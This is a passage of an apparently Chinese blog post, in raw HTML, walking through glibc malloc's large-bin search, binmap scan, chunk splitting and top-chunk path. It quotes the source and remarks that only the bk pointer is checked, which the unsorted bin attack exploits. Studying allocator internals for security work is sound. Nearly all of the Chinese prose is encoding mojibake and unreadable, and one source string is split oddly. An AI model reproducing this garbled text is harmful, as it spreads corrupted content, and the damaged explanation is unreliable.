class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">            victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">            victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): cor</span></span><br><span class="line"><span class="string">                    rupted unsorted chunks&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™è¾¹å°±çœ‹è¿™ä¸ªæœ€å°èƒ½æ»¡è¶³çš„<code>nb</code>æ˜¯å¦åœ¨<code>small bin</code>çš„èŒƒå›´å†…ã€‚ä¸åœ¨åˆ™æ‰§è¡Œï¼Œå…¶å®å¦‚æœåœ¨çš„è¯ï¼Œé‚£å‰é¢æœ‰ä¸€ä¸ª<code>small bin</code>çš„èŒƒå›´åˆ¤æ–­ï¼Œå¦‚æœ<code>small bin</code>èŒƒå›´é‚£ï¼Œ<code>idx</code>å°±æ˜¯<code>small bin</code>ï¼Œä¸åœ¨åˆ™æ˜¯<code>large bin</code>çš„<code>idx</code>ã€‚<code>small bin</code>ä¹‹å‰å·²ç»åˆ¤æ–­è¿‡ä¸€éäº†ï¼Œå¹¶ä¸”åˆ¤æ–­ç­–ç•¥ä¹Ÿè·Ÿä¹‹å‰ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿™é‡ŒåŠ ä¸€ä¸ª<code>!in_small_bin_range</code>çš„åˆ¤æ–­è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚</p><p>æ¥çœ‹ä¸‹é¢çš„ifè¯­å¥ï¼Œä¸¤ä¸ªæ¡ä»¶ã€‚</p><ol><li><code>(victim = first (bin)) != bin</code>ï¼šè¿™ä¸ªbiné‡Œé¢æœ‰<code>chunk</code>ï¼Œå¹¶ä½¿<code>victim=bin-&gt;fd</code></li><li><code>(unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)</code>ï¼šæ‰¾åˆ°ç›®æ ‡chunkçš„sizeè¦å¤§äºç­‰äºè¿™ä¸ªæœ€å°èƒ½æ»¡è¶³çš„size  nbã€‚</li></ol><p>åŒæ—¶æ»¡è¶³é‚£ä¹ˆå°±å¯èƒ½è¦å–è¿™ä¸€å—chunkæ¥åˆ†é…äº†ï¼Œæ­£å¦‚æ³¨é‡Šæ‰€è¯´ï¼Œå¦‚æœbinä¸ºç©ºæˆ–è€…æœ€å¤§çš„chunkè¿˜æ˜¯æ¯”è¾ƒå°ï¼Œé‚£å°±è·³è¿‡è¿™ä¸ªé€»è¾‘ã€‚ç„¶å<code>victim = victim-&gt;bk_nextsize</code>ï¼Œè¿™é‡Œ<code>victim</code>æ˜¯æœ€å¤§å—ï¼Œæœ€å¤§å—çš„<code>bk_nextsize</code>å°±æ˜¯æœ€å°å—ï¼Œè¿™é‡Œåº”è¯¥ä¹Ÿæ˜¯å°½é‡å¯»æ‰¾æœ€å°èƒ½æ»¡è¶³çš„å—ã€‚æ­£å¦‚å¾ªç¯æ‰€æè¿°ï¼Œå¦‚æœ<code>victim</code>çš„<code>chunk size</code>æ¯”æˆ‘æ‰€éœ€çš„æœ€å°èƒ½æ»¡è¶³çš„<code>chunk size</code> <code>nb</code>è¿˜å°ï¼Œé‚£å°±å»å¯»æ‰¾æ¯”ä»–å¤§çš„ï¼Œå› ä¸ºæ˜¯é€’å¢ï¼Œæ‰€ä»¥èƒ½ä¿è¯åœ¨<code>chunk</code>å½“ä¸­æˆ‘ä¸€å®šä¼šæ‰¾åˆ°ä¸€ä¸ªæœ€å°èƒ½æ»¡è¶³çš„<code>chunk</code>ã€‚</p><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸¤ä¸ªæœ€å°èƒ½æ»¡è¶³çš„æ„æ€ï¼š</p><p>é¦–å…ˆ<code>nb</code>æ˜¯æŒ‡ç”¨æˆ·éœ€è¦çš„æœ€å°èƒ½æ»¡è¶³çš„å—çš„<code>size</code>ï¼Œæ¯”å¦‚æˆ‘åªéœ€è¦1ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æˆ‘æœ€å°çš„<code>chunk size</code>éƒ½æ˜¯<code>0x20</code>äº†ï¼Œ<code>0x20</code>çš„<code>chunk</code>å°±æ˜¯å¯¹ç”¨æˆ·æœ€å°èƒ½æ»¡è¶³çš„<code>chunk size</code>äº†ã€‚</p><p>å¦‚æœèƒ½æ‰¾åˆ°<code>size=nb</code>çš„å—ï¼Œå½“ç„¶æ˜¯æœ€å¥½ä¸è¿‡äº†ï¼Œä½†æ˜¯ç°å®å¾€å¾€ä¸ä¼šé‚£ä¹ˆé¡ºåˆ©ï¼Œæ¯”å¦‚æˆ‘åªæœ‰ä¸€ä¸ª<code>0x30</code>çš„å—ï¼Œå¦‚æœæˆ‘åªæœ‰<code>0x30</code>è€Œæ²¡æœ‰<code>0x20</code>çš„å—ï¼Œé‚£ä¹ˆ<code>0x30</code>å°±æ˜¯æˆ‘æ‰€æœ‰<code>free</code>å—å½“ä¸­çš„æœ€å°èƒ½æ»¡è¶³ï¼Œå…¶å®è¿™é‡Œ<code>nb</code>åº”è¯¥å«æœ€ä¼˜èƒ½æ»¡è¶³ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä¹ æƒ¯è¿™ä¹ˆå«äº†hhhã€‚</p><p>ç„¶åå‘¢æ‰¾åˆ°è¿™ä¸ªä¹‹åå°±<code>unlink</code>è¿™ä¸ªå—ï¼ŒæŠŠå®ƒä»é“¾ä¸­åˆ é™¤ï¼Œæ‹¿å‡ºæ¥ä¹‹åè¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœåˆ‡å‰²ä¹‹åçš„å—å°äºMINSIZEï¼Œé‚£å°±ä¸åˆ‡å‰²äº†ï¼Œç›´æ¥æŠŠå®ƒç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå¿«<code>prev_inuse</code>ä½è®¾1ï¼Œè¿™ä¸ªå—å°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·äº†ã€‚å¦åˆ™å°±æ˜¯åˆ‡å‰²ï¼Œè®¾ç½®å„ç§ä¸œè¥¿ï¼Œè¿™ä¸ªå‰é¢æœ‰å·®ä¸å¤šçš„ä»£ç ï¼Œæˆ‘ä»¬ä¸»è¦çœ‹çœ‹å‰©ä¸‹çš„å—å»å“ªé‡Œäº†ï¼Œå¾ˆæ˜æ˜¾ï¼Œé‡æ–°é“¾å…¥<code>unsorted bin</code>äº†ã€‚åé¢æœ‰ä¸€ä¸ª<code>check</code>ï¼Œå¦‚æœ<code>unsorted bin-&gt;fd-&gt;bk!=unsorted bin</code>ï¼Œé‚£ä¹ˆæŠ¥é”™é€€å‡ºã€‚è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œå®ƒåªæ£€æµ‹äº†<code>unsorted bin-&gt;fd-&gt;bk</code>æ˜¯å¦ç­‰äºé‚£ä¸ª<code>unsorted bin</code>ï¼Œå¯¹äºå †å—æ¥è¯´æˆ‘å°±æ˜¯åªæ£€æµ‹äº†<code>bk</code>æŒ‡é’ˆï¼Œè¿™æ„å‘³ç€<code>fd</code>æŒ‡é’ˆå¦‚æœä¿®æ”¹ä¸ºä»»æ„å€¼ä¸ä¼šåœ¨è¿™é‡Œè¢«æ£€æµ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ªåˆ©ç”¨å°æŠ€å·§ï¼Œä¹Ÿåªæœ‰ä½ è¯»è¿‡æºç åæ‰èƒ½å¥½å¥½ç†è§£è¿™ä¸ª<code>unsorted bin attack</code>äº†ã€‚ç„¶åå¦‚æœå‰©ä½™å¤§å°ä¸åœ¨<code>small bin</code>èŒƒå›´å†…æŠŠ<code>nextsize</code>æŒ‡é’ˆå…¨éƒ¨æ¸…ç©ºï¼Œå…¶å®ƒå°±æ˜¯æ­£å¸¸è¿”å›äº†ã€‚å¦‚æœè¢«åˆ‡å‰²çš„å‰©ä¸‹<code>chunk</code>ä¸åœ¨<code>small bin</code>èŒƒå›´å†…ï¼Œå°±ä¼šæ¸…ç©ºå®ƒçš„<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ã€‚å› ä¸ºå®ƒè¦å›åˆ°<code>unsorted bin</code>é‡Œé¢ï¼Œè¿™ä¸¤ä¸ªå­—æ®µå°±æ²¡ä»€ä¹ˆç”¨äº†ï¼Œå°±ä¼šè¢«æ¸…ç©ºã€‚</p><h4 id="ç¬¬ä¸ƒå°å—"><a href="#ç¬¬ä¸ƒå°å—" class="headerlink" title="ç¬¬ä¸ƒå°å—"></a>ç¬¬ä¸ƒå°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥è®²ä¸€è®²<code>arena</code>çš„<code>binmap</code>ç»“æ„ï¼Œè¿™ä¸ªç”¨äºå¿«é€Ÿæ£€ç´¢ä¸€ä¸ª<code>bin</code>æ˜¯å¦ä¸ºç©ºï¼Œæ¯ä¸€ä¸ª<code>bit</code>è¡¨ç¤ºå¯¹åº”çš„<code>bin</code>ä¸­æ˜¯å¦å­˜åœ¨ç©ºé—²<code>chunk</code>ï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆå‰é¢æ²¡æœ‰ç”¨åˆ°ã€‚è¿™ä¸€æ®µå°±æ˜¯è¯´ï¼Œå¦‚æœ<code>large bin</code>æœç´¢å®Œäº†éƒ½æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„<code>chunk</code>ï¼Œé‚£ä¹ˆå°±å»ä¸‹ä¸€ä¸ª<code>idx</code>é‡Œé¢å¯»æ‰¾ï¼Œè¿™å¾ˆåˆç†ã€‚ç„¶åä¸€å…±æœ‰4ä¸ªintï¼Œæ¯ä¸ª<code>int</code>32ä½è¡¨ç¤ºä¸€å—<code>map</code>ï¼Œä¸€å…±è¡¨ç¤º<code>128</code>ä½ã€‚</p><h4 id="ç¬¬å…«å°å—"><a href="#ç¬¬å…«å°å—" class="headerlink" title="ç¬¬å…«å°å—"></a>ç¬¬å…«å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥çœ‹çœ‹ä¸¤ä¸ªæ¡ä»¶</p><ol><li><code>bit&gt;map</code>ï¼šå¦‚æœè¿™ä¸ªä½çš„æƒå€¼éƒ½æ¯”å®ƒæ•´ä¸ªçš„<code>map</code>éƒ½å¤§äº†ï¼Œè¯´æ˜<code>map</code>ä¸Šé‚£ä¸ª<code>bit</code>çš„æƒå€¼å¿…å®šä¸º0</li><li><code>bit==0</code>ï¼šå¦‚æœè¿™ä¸ª<code>bit</code>éƒ½æ˜¯0è¯´æ˜è¿™ä¸ª<code>index</code>ä¹Ÿä¸å¯¹ã€‚</li></ol><p>æ»¡è¶³å…¶ä¸€å°±çœ‹çœ‹åˆ«çš„<code>index</code>ã€‚</p><p>ç„¶åå¦‚æœè¯´<code>map==0</code>ï¼Œè¯´æ˜è¿™æ•´ä¸ª<code>block</code>éƒ½æ²¡æœ‰ç©ºé—²å—ï¼Œå°±ç›´æ¥è·³è¿‡ï¼Œä¸ä¸º0åˆ™é€€å‡ºå»æ‰§è¡Œä¸‹é¢çš„æ“ä½œï¼Œå¦‚æœè¶…è¿‡äº†<code>block</code>çš„æ€»æ•°ï¼Œé‚£å°±è¯´æ˜<code>unsorted bin</code>å’Œ<code>large bin</code>ä¸­ä¹Ÿæ²¡æœ‰åˆé€‚çš„<code>chunk</code>ï¼Œé‚£æˆ‘ä»¬å°±åˆ‡å‰²<code>top_chunk</code>äº†ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ª<code>goto</code>è·³è½¬ï¼Œæˆ‘ä»¬åé¢åˆ†æã€‚</p><h4 id="ç¬¬ä¹å°å—"><a href="#ç¬¬ä¹å°å—" class="headerlink" title="ç¬¬ä¹å°å—"></a>ç¬¬ä¹å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert (bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">victim = last (bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin)</span><br><span class="line">&#123;</span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘å·²ç»æ‰¾åˆ°äº†ä¸€ä¸ªåˆé€‚çš„<code>block</code>ï¼Œç„¶åå°±æ˜¯çœ‹<code>block</code>çš„å„ä¸ªä½äº†ã€‚ä»ä½ä½å¼€å§‹ï¼Œå¦‚æœæ£€æŸ¥åˆ°<code>map</code>é‚£ä¸€ä½å¯¹åº”ä¸º0å°±æ‰¾ä¸‹ä¸€ä½ï¼Œæˆ‘ä»¬å‰é¢æåˆ°bkä¸º<code>large bin</code>çš„æœ€å°å—ï¼Œæ‰€ä»¥å…ˆè€ƒè™‘å®ƒï¼Œå½“ç„¶ä¸èƒ½è¯´<code>map</code>é‡Œé¢è¯´è¿™é‡Œæœ‰å®ƒå°±æœ‰ï¼Œæˆ‘è¿˜å¾—è‡ªå·±åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª<code>bin</code>é‡Œé¢æ˜¯ä¸æ˜¯çœŸçš„æœ‰ï¼Œå¦‚æœæ²¡æœ‰(<code>bin-&gt;bk==bin</code>)ï¼Œé‚£ä¹ˆæˆ‘å°±è¦åŠæ—¶æŠŠæ ‡å¿—ä½æ¸…é™¤ç„¶å<code>bit&lt;&lt;1</code>å»å¯»æ‰¾ä¸‹ä¸€ä¸ª<code>index</code>ã€‚</p><h4 id="æœ€åä¸€å°å—"><a href="#æœ€åä¸€å°å—" class="headerlink" title="æœ€åä¸€å°å—"></a>æœ€åä¸€å°å—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">        have to perform a complete insert here.  */</span></span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå®ƒç¡®å®æœ‰<code>chunk</code>å‘¢ï¼Ÿç„¶åå…¶å®å®ƒè¿˜æ˜¯è·Ÿå‰é¢ä¸€æ ·çš„ï¼Œåœ¨<code>large bin</code>ä¸­æ‰¾åˆ°<code>chunk</code>çš„å¤„ç†æ–¹å¼ï¼Œ<code>unlink</code>ï¼Œåˆ‡å‰²ï¼Œåˆ¤æ–­ï¼Œè®¾ç½®æ ‡å¿—ä½ï¼Œåˆ‡å‰²ååŠæ—¶æ›´æ–°<code>last_remainder</code>ï¼Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ª<code>large bin</code>çš„éå†ã€‚</p><p>è¿˜è¦è®²ä¸€ä¸‹çš„å°±æ˜¯è¿™ä¸ª<code>check</code>ï¼Œä¾æ—§æ˜¯å¯¹<code>unsorted bin</code>çš„ä¸€ä¸ª<code>check</code>ï¼Œåˆ¤æ–­ç¬¬ä¸€ä¸ª<code>unsorted chunk</code>çš„<code>bk</code>æŒ‡é’ˆæ˜¯å¦æŒ‡å‘<code>unsorted bin</code>çš„ä½ç½®ã€‚è¿™é‡Œéœ€è¦æŠŠå‰²å‰©ä¸‹çš„<code>chunk</code>é‡æ–°æ”¾å›<code>unsorted bin</code>ã€‚è‡³æ­¤æ•´ä¸ª<code>unsorted bin</code>å’Œ<code>large bin</code>çš„åˆ†é…å°±è®²å®Œäº†ã€‚</p><h3 id="ç¬¬å…­æ®µï¼šåˆ‡å‰²top-chunk"><a href="#ç¬¬å…­æ®µï¼šåˆ‡å‰²top-chunk" class="headerlink" title="ç¬¬å…­æ®µï¼šåˆ‡å‰²top_chunk"></a>ç¬¬å…­æ®µï¼šåˆ‡å‰²top_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">             (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">             search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">             less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">             be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">             limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">             MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">             exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">             reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">             to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        av-&gt;top = remainder;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | 